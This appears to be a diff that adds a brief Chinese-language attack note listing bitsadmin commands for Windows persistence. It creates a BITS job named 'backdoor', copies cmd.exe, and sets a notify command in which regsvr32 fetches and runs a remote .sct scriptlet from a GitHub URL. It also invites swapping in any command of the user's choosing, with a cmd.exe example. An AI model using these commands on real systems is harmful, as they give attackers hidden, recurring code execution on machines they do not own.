@@ -1,0 +1,7 @@
+#1.bitsadmin添加自启动!!!!!
+	1.bitsadmin /create backdoor
+	2.bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
+	3.bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+	这一步可以替换成自己要执行的命令，例如：
+	bitsadmin.exe /SetNotifyCmdLine backdoor "%COMSPEC%" "cmd.exe /c regedit.exe"
+	4.bitsadmin /Resume backdoor
